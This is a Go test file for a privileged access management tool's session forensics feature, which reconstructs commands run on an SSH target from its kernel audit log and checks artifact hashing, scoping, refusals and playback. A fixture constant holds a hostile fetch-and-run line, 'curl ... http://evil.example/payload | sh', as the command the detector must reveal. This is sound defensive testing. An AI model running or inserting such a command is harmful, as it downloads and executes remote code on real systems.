package api_test

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"strings"
	"testing"
	"time"

	"github.com/morandeirachema/pamv1/internal/api"
	"github.com/morandeirachema/pamv1/internal/auth"
	"github.com/morandeirachema/pamv1/internal/store"
	"github.com/morandeirachema/pamv1/internal/store/memstore"
	"github.com/morandeirachema/pamv1/internal/vault"
)

// forensicHidden is the command the operator actually ran — visible only in the
// target's kernel audit record, not in the session recording.
const forensicHidden = "curl -s http://evil.example/payload | sh"

// forensicFixture is `ausearch -m EXECVE` output holding one exec inside the
// session window (hex-encoded, as auditd encodes any argument containing
// spaces) and one belonging to a different session hours earlier.
func forensicFixture(now time.Time) string {
	rec := func(ts time.Time, serial, pid, exe, execve string) string {
		stamp := "msg=audit(" + itoa(ts.Unix()) + ".000:" + serial + ")"
		return "----\ntype=SYSCALL " + stamp + ": arch=c000003e syscall=59 success=yes exit=0 ppid=1000 pid=" + pid +
			" auid=1000 uid=0 comm=\"sh\" exe=\"" + exe + "\" key=\"pamv1-exec\"\n" +
			"type=EXECVE " + stamp + ": " + execve + "\n"
	}
	return rec(now, "5001", "4242", "/bin/sh",
		`argc=3 a0="/bin/sh" a1="-c" a2=`+hex.EncodeToString([]byte(forensicHidden))) +
		rec(now.Add(-8*time.Hour), "4000", "1111", "/usr/bin/id", `argc=1 a0="id"`)
}

// forensicServer builds a real api.Server (not just its handler) wired to an
// in-process SSH target that answers pamv1's fixed forensic command with
// `audit`, seeds that target and its vaulted credential, and returns the
// server, its store, the recording directory and the target/credential ids.
func forensicServer(t *testing.T, audit string, enabled bool, opts api.Options) (*api.Server, store.Store, string, int64, int64) {
	t.Helper()
	up := startAccountScanSSHServer(t, "root", "s3cret", audit)
	recDir := t.TempDir()
	st := memstore.New()
	masterKey, err := vault.GenerateMasterKey()
	if err != nil {
		t.Fatal(err)
	}
	v, err := vault.New(masterKey)
	if err != nil {
		t.Fatal(err)
	}
	resolver, err := auth.NewResolver(st, testAPIKey, "")
	if err != nil {
		t.Fatal(err)
	}
	opts.RecordingDir = recDir
	opts.SessionForensics = enabled
	if opts.SessionForensicsTimeout == 0 {
		opts.SessionForensicsTimeout = 10 * time.Second
	}
	srv, err := api.New(st, v, resolver, nil, opts)
	if err != nil {
		t.Fatal(err)
	}
	ctx := context.Background()
	target := &store.Target{Name: "web-01", Host: up.host, Port: up.port, OSType: "linux", Protocol: "ssh"}
	if err := st.CreateTarget(ctx, target); err != nil {
		t.Fatal(err)
	}
	cred := &store.Credential{TargetID: target.ID, Username: "root", SecretType: store.SecretTypePassword}
	if err := st.CreateCredential(ctx, cred); err != nil {
		t.Fatal(err)
	}
	enc, err := v.Encrypt(ctx, "s3cret", store.CredentialAAD(target.ID, cred.ID))
	if err != nil {
		t.Fatal(err)
	}
	if err := st.UpdateCredentialSecretEnc(ctx, cred.ID, enc); err != nil {
		t.Fatal(err)
	}
	return srv, st, recDir, target.ID, cred.ID
}

// auditDetail returns the detail of the newest event with the given action.
func auditDetail(t *testing.T, st store.Store, action string) string {
	t.Helper()
	events, err := st.ListAudit(context.Background(), 50)
	if err != nil {
		t.Fatal(err)
	}
	for _, e := range events {
		if e.Action == action {
			return e.Detail
		}
	}
	return ""
}

// TestCollectSessionForensicsReconstructsWhatRan is the collector's flagship
// proof: pamv1 pulls the TARGET's own kernel audit record over the same vaulted
// credential after the session, and the stored artifact names the decoded
// command the recording could not show — scoped to the session's window, hashed
// into the audit trail, with no secret in it.
func TestCollectSessionForensicsReconstructsWhatRan(t *testing.T) {
	now := time.Now()
	srv, st, _, tid, cid := forensicServer(t, forensicFixture(now), true, api.Options{})

	srv.CollectSessionForensics(context.Background(), api.SessionForensicsRequest{
		TargetID: tid, CredentialID: cid, Actor: "alice", SessionID: "sess-1",
		Started: now.Add(-time.Minute), Ended: now.Add(time.Minute),
	})

	detail := auditDetail(t, st, "session.forensics")
	if detail == "" {
		t.Fatal("no session.forensics audit row")
	}
	for _, want := range []string{"target:web-01", "session:", "events:1", "scanned:2"} {
		if !strings.Contains(detail, want) {
			t.Fatalf("session.forensics detail %q missing %q", detail, want)
		}
	}
	file, sum := fieldAfter(detail, "file:"), fieldAfter(detail, "sha256:")
	if file == "" || sum == "" || !strings.HasSuffix(file, ".forensics.log") {
		t.Fatalf("artifact not registered: %q", detail)
	}
	raw, err := os.ReadFile(file) // #nosec G304 -- test-owned path from the audit row
	if err != nil {
		t.Fatal(err)
	}
	if got := sha256.Sum256(raw); hex.EncodeToString(got[:]) != sum {
		t.Fatalf("artifact hash mismatch: %x vs %s", got, sum)
	}
	body := string(raw)
	if !strings.Contains(body, forensicHidden) {
		t.Fatalf("the artifact must name what actually ran:\n%s", body)
	}
	// Another session's exec, eight hours earlier, must not bleed in.
	if strings.Contains(body, "/usr/bin/id") {
		t.Fatalf("another session's exec leaked into the artifact:\n%s", body)
	}
	// The artifact is honest about what it is — and carries no secret.
	if !strings.Contains(body, "audit-only") || !strings.Contains(body, "TARGET's own kernel audit records") {
		t.Fatalf("the artifact must state its own limits:\n%s", body)
	}
	if strings.Contains(body, "s3cret") {
		t.Fatal("the vaulted secret leaked into the artifact")
	}
}

// TestCollectSessionForensicsUnavailableIsAFinding proves the honest-empty
// property end to end: a target with no auditd (or a credential that may not
// read the log) produces an audited FINDING, not silence — because "nothing was
// recorded" and "nothing ran" must never look the same.
func TestCollectSessionForensicsUnavailableIsAFinding(t *testing.T) {
	now := time.Now()
	srv, st, _, tid, cid := forensicServer(t, "bash: ausearch: command not found\n", true, api.Options{})

	srv.CollectSessionForensics(context.Background(), api.SessionForensicsRequest{
		TargetID: tid, CredentialID: cid, Actor: "alice", SessionID: "sess-2",
		Started: now.Add(-time.Minute), Ended: now,
	})
	detail := auditDetail(t, st, "session.forensics_unavailable")
	if detail == "" || !strings.Contains(detail, "target:web-01") {
		t.Fatalf("expected an unavailable finding, got %q", detail)
	}
	if auditDetail(t, st, "session.forensics") != "" {
		t.Fatal("an unavailable reconstruction must not be audited as a successful one")
	}
	// The artifact still exists and says so plainly.
	file := fieldAfter(detail, "file:")
	if file == "" {
		t.Fatalf("no artifact for the finding: %q", detail)
	}
	raw, err := os.ReadFile(file) // #nosec G304 -- test-owned path from the audit row
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(raw), "UNAVAILABLE") {
		t.Fatalf("artifact should state UNAVAILABLE:\n%s", raw)
	}
}

// TestCollectSessionForensicsRefusals covers the paths that must NOT run a
// command on a target: the feature switched off, a Zero Standing Privilege
// credential (whose session certificate is gone, and minting another would be a
// fresh privileged access after the approval was consumed), and an operator
// deny pattern that happens to match pamv1's own fixed literal.
func TestCollectSessionForensicsRefusals(t *testing.T) {
	now := time.Now()
	req := func(tid, cid int64) api.SessionForensicsRequest {
		return api.SessionForensicsRequest{TargetID: tid, CredentialID: cid, Actor: "alice",
			SessionID: "sess-3", Started: now.Add(-time.Minute), Ended: now}
	}

	t.Run("disabled", func(t *testing.T) {
		srv, st, _, tid, cid := forensicServer(t, forensicFixture(now), false, api.Options{})
		srv.CollectSessionForensics(context.Background(), req(tid, cid))
		for _, action := range []string{"session.forensics", "session.forensics_unavailable", "session.forensics_failed"} {
			if d := auditDetail(t, st, action); d != "" {
				t.Fatalf("the switch must gate everything; got %s: %q", action, d)
			}
		}
	})

	t.Run("zero standing privilege credential", func(t *testing.T) {
		srv, st, _, tid, _ := forensicServer(t, forensicFixture(now), true, api.Options{})
		ctx := context.Background()
		zsp := &store.Credential{TargetID: tid, Username: "root", SecretType: store.SecretTypeSSHCA}
		if err := st.CreateCredential(ctx, zsp); err != nil {
			t.Fatal(err)
		}
		srv.CollectSessionForensics(ctx, req(tid, zsp.ID))
		d := auditDetail(t, st, "session.forensics_unavailable")
		if !strings.Contains(d, "zero-standing-privilege") {
			t.Fatalf("expected a ZSP refusal finding, got %q", d)
		}
	})

	t.Run("command control", func(t *testing.T) {
		srv, st, _, tid, cid := forensicServer(t, forensicFixture(now), true,
			api.Options{CommandGuard: denyGuard(t, `(?i)ausearch`)})
		srv.CollectSessionForensics(context.Background(), req(tid, cid))
		if d := auditDetail(t, st, "session.forensics_failed"); !strings.Contains(d, "command-blocked") {
			t.Fatalf("a deny pattern must refuse pamv1's own literal too, got %q", d)
		}
		if d := auditDetail(t, st, "command.blocked"); !strings.Contains(d, "path:forensics") {
			t.Fatalf("the refusal should be audited as command.blocked, got %q", d)
		}
	})

	t.Run("non-ssh target", func(t *testing.T) {
		srv, st, _, _, _ := forensicServer(t, forensicFixture(now), true, api.Options{})
		ctx := context.Background()
		win := &store.Target{Name: "win-01", Host: "10.0.0.9", Port: 5985, OSType: "windows", Protocol: "winrm"}
		if err := st.CreateTarget(ctx, win); err != nil {
			t.Fatal(err)
		}
		cred := &store.Credential{TargetID: win.ID, Username: "svc", SecretType: store.SecretTypePassword}
		if err := st.CreateCredential(ctx, cred); err != nil {
			t.Fatal(err)
		}
		srv.CollectSessionForensics(ctx, req(win.ID, cred.ID))
		for _, action := range []string{"session.forensics", "session.forensics_unavailable", "session.forensics_failed"} {
			if d := auditDetail(t, st, action); d != "" {
				t.Fatalf("a winrm target has no PTY blind spot to reconstruct; got %s: %q", action, d)
			}
		}
	})
}

// TestForensicsArtifactsAreListedAndPlayable closes the loop an auditor uses:
// the artifact (and the Kubernetes transcript Phase 155 introduced) must be
// visible in the recordings listing and servable by the playback route —
// otherwise the evidence exists on disk but nobody can reach it from the
// console. This is the call site Phase 155 missed for `.k8s.log`.
func TestForensicsArtifactsAreListedAndPlayable(t *testing.T) {
	now := time.Now()
	srv, _, recDir, tid, cid := forensicServer(t, forensicFixture(now), true, api.Options{})
	srv.CollectSessionForensics(context.Background(), api.SessionForensicsRequest{
		TargetID: tid, CredentialID: cid, Actor: "alice", SessionID: "sess-4",
		Started: now.Add(-time.Minute), Ended: now.Add(time.Minute),
	})
	// A Kubernetes transcript and an ssh_exec transcript, both written by the
	// same shared writer. Each new suffix has to be added to the listing regex and
	// the classifier as well as the writer, which is exactly the pair Phase 155
	// got half of — so every suffix in the family is pinned here from now on.
	for name, body := range map[string]string{
		"20260817-000000_web-01_alice.k8s.log": "# pamv1 Kubernetes session\n",
		"20260818-000000_db-01_bot.ssh.log":    "# pamv1 SSH session\n",
	} {
		if err := os.WriteFile(recDir+"/"+name, []byte(body), 0o600); err != nil {
			t.Fatal(err)
		}
	}

	ts := httptest.NewServer(srv)
	t.Cleanup(ts.Close)
	status, data := do(t, ts, http.MethodGet, "/api/recordings", testAPIKey, nil)
	if status != http.StatusOK {
		t.Fatalf("list recordings: %d %s", status, data)
	}
	var list []struct{ Name, Kind string }
	if err := json.Unmarshal(data, &list); err != nil {
		t.Fatal(err)
	}
	var forensicName, k8sName, sshName string
	for _, r := range list {
		switch {
		case strings.HasSuffix(r.Name, ".forensics.log"):
			forensicName = r.Name
			if r.Kind != "forensics" {
				t.Fatalf("forensics artifact classified as %q", r.Kind)
			}
		case strings.HasSuffix(r.Name, ".k8s.log"):
			k8sName = r.Name
			if r.Kind != "transcript" {
				t.Fatalf("kubernetes transcript classified as %q", r.Kind)
			}
		case strings.HasSuffix(r.Name, ".ssh.log"):
			sshName = r.Name
			if r.Kind != "transcript" {
				t.Fatalf("ssh_exec transcript classified as %q", r.Kind)
			}
		}
	}
	if forensicName == "" || k8sName == "" || sshName == "" {
		t.Fatalf("every brokered-command artifact must be listed: %s", data)
	}
	// And servable, not merely listed — the half Phase 155 missed.
	if st, body := do(t, ts, http.MethodGet, "/api/recordings/"+sshName, testAPIKey, nil); st != http.StatusOK || !strings.Contains(string(body), "pamv1 SSH session") {
		t.Fatalf("playback of the ssh_exec transcript: %d %s", st, body)
	}
	status, body := do(t, ts, http.MethodGet, "/api/recordings/"+forensicName, testAPIKey, nil)
	if status != http.StatusOK || !strings.Contains(string(body), forensicHidden) {
		t.Fatalf("playback of the forensic artifact: %d %s", status, body)
	}
}
